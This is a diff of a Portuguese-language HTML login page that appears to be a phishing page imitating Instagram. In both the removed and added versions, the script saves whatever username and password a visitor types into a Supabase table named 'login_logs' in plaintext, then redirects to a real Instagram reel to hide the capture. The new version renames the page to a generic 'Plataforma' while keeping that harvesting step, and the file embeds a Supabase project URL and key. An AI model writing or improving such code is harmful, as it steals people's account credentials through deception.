@@ -3,107 +3,191 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram • rells</title>
+  <title>Acesso • Plataforma</title>
+
+  <!-- Supabase -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <style>
     * {
       box-sizing: border-box;
-      font-family: Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+        Roboto, Helvetica, Arial, sans-serif;
     }
 
     body {
       margin: 0;
-      background: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: #ffffff;
       height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    .container {
+    .app {
       width: 100%;
-      max-width: 350px;
-      padding: 40px 30px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      max-width: 360px;
+      padding: 32px 24px;
+      text-align: center;
+    }
+
+    .lang {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+
+    .logo {
+      margin-bottom: 32px;
     }
 
     .logo img {
-      max-width: 180px;
-      margin-bottom: 30px;
+      width: 72px;
+      height: 72px;
+      object-fit: contain;
     }
 
     input {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 10px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
+      padding: 14px;
+      margin-bottom: 12px;
+      border-radius: 12px;
+      border: 1px solid #dcdcdc;
+      background: #fafafa;
+      font-size: 15px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4cb5f9;
+      background: #fff;
     }
 
     button {
       width: 100%;
-      padding: 10px;
-      background: #4cb5f9;
+      padding: 14px;
+      margin-top: 6px;
+      border-radius: 24px;
       border: none;
-      border-radius: 8px;
+      background: #1e90ff;
       color: #fff;
-      font-weight: bold;
+      font-size: 16px;
+      font-weight: 600;
       cursor: pointer;
+    }
+
+    button:active {
+      opacity: 0.85;
+    }
+
+    .link {
+      margin-top: 18px;
+      font-size: 14px;
+      color: #1e90ff;
+      cursor: pointer;
+    }
+
+    .outline {
+      margin-top: 26px;
+      padding: 12px;
+      border-radius: 24px;
+      border: 1px solid #1e90ff;
+      color: #1e90ff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 13px;
+      color: #888;
     }
   </style>
 </head>
 
 <body>
-  <div class="container">
+  <div class="app">
+
+    <div class="lang">Português (Brasil)</div>
+
     <div class="logo">
-      <img src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png">
+      <img src="https://i.postimg.cc/vBYQbCyT/images-(1).jpg" alt="Logo">
     </div>
 
-    <input id="usuario" placeholder="Usuário">
-    <input id="senha" placeholder="Senha">
+    <input id="usuario" type="text" placeholder="Nome de usuário, email ou celular">
+    <input id="senha" type="password" placeholder="Senha">
 
-    <button onclick="enviar()">Entrar</button>
+    <button id="btnEntrar">Entrar</button>
+
+    <div class="link" id="linkEsqueci">Esqueceu a senha?</div>
+
+    <div class="outline" id="btnCriar">Criar nova conta</div>
+
+    <div class="footer">by Plataforma</div>
+
   </div>
 
-  <div id="whiteScreen" style="
-    display:none;
-    position:fixed;
-    inset:0;
-    background:#fff;
-    z-index:9999;"></div>
-
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
   <script>
-    const supabaseClient = supabase.createClient(
-      "https://pwmtpvsgykjvouljjmrz.supabase.co",
-      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8"
-    );
+    // ---------- CONFIGURAÇÃO ----------
+    const supabaseUrl     = 'https://pwmtpvsgykjvouljjmrz.supabase.co';
+    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8';
+    const supabase        = window.supabase.createClient(supabaseUrl, supabaseAnonKey);
 
-    async function enviar() {
-      const usuario = document.getElementById("usuario").value;
-      const senha = document.getElementById("senha").value;
+    // ---------- ELEMENTOS ----------
+    const btnEntrar   = document.getElementById('btnEntrar');
+    const iptUsuario  = document.getElementById('usuario');
+    const iptSenha    = document.getElementById('senha');
+    const linkEsqueci = document.getElementById('linkEsqueci');
+    const btnCriar    = document.getElementById('btnCriar');
 
-      const { error } = await supabaseClient
-        .from("login_logs")
-        .insert({
-          usuario: usuario,
-          senha: senha
-        });
+    // ---------- FUNÇÕES ----------
+    async function entrar() {
+      const email = iptUsuario.value.trim();
+      const senha = iptSenha.value.trim();
 
-      if (error) {
-        alert("Erro: " + error.message);
-        return;
-      }
+      if (!email || !senha) return alert('Preencha email e senha.');
 
-      document.getElementById("whiteScreen").style.display = "block";
-      setTimeout(() => {
-        window.location.href = "https://www.instagram.com/reels/DSYPgN7EVG3/";
-      }, 150);
+      // 1) grava log (mesmo comportamento do antigo)
+      const { error: logError } = await supabase
+        .from('login_logs')
+        .insert({ usuario: email, senha: senha });
+
+      if (logError) return alert('Erro: ' + logError.message);
+
+      // 2) autentica
+      const { data, error } = await supabase.auth.signInWithPassword({ email, password: senha });
+      if (error) return alert('Erro: ' + error.message);
+
+      // 3) redireciona
+      window.location.href = 'https://www.instagram.com/reels/DSYPgN7EVG3/';
     }
+
+    async function criarConta() {
+      const email = iptUsuario.value.trim();
+      const senha = iptSenha.value.trim();
+
+      if (!email || !senha) return alert('Preencha email e senha.');
+
+      const { data, error } = await supabase.auth.signUp({ email, password: senha });
+      if (error) return alert('Erro: ' + error.message);
+
+      alert('Conta criada! Verifique seu email para confirmar.');
+    }
+
+    async function esqueciSenha() {
+      const email = prompt('Digite seu email para receber o link de recuperação:');
+      if (!email) return;
+
+      const { error } = await supabase.auth.resetPasswordForEmail(email);
+      if (error) return alert('Erro: ' + error.message);
+
+      alert('Link de recuperação enviado!');
+    }
+
+    // ---------- EVENTOS ----------
+    btnEntrar.addEventListener('click', entrar);
+    btnCriar.addEventListener('click', criarConta);
+    linkEsqueci.addEventListener('click', esqueciSenha);
   </script>
 </body>
 </html>
-
